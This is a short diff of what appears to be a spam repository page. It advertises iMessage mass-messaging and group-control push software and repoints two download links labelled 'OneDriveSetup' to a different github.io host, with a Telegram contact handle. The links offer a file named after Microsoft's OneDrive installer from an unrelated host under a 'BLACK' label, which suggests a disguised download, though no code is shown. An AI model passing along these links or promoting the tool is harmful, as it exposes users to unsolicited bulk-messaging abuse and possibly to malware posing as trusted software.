@@ -7,12 +7,12 @@ iMessage苹果推群发/iMessage苹果群发软件设备/真机群控推送源�
 
 -----------------------
 
-<a href="https://imessagee.github.io/ccc/OneDriveSetup" title="✈️@PUSHHHKKK">
+<a href="https://pushkkk.github.io/ccc/OneDriveSetup" title="✈️@PUSHHHKKK">
   <div class="md-source" class="md-source__repository md-source__repository--active">
    🔗【 ❤️ BLACK ❤️ 】OneDriveSetup  🔎
 </a>
 
-<a href="https://imessagee.github.io/ccc/OneDriveSetup" title="✈️@PUSHHHKKK">
+<a href="https://pushkkk.github.io/ccc/OneDriveSetup" title="✈️@PUSHHHKKK">
   <div class="md-source" class="md-source__repository md-source__repository--active">
    🔗【 ❤️ BLACK ❤️ 】OneDriveSetup 🔎
 </a>
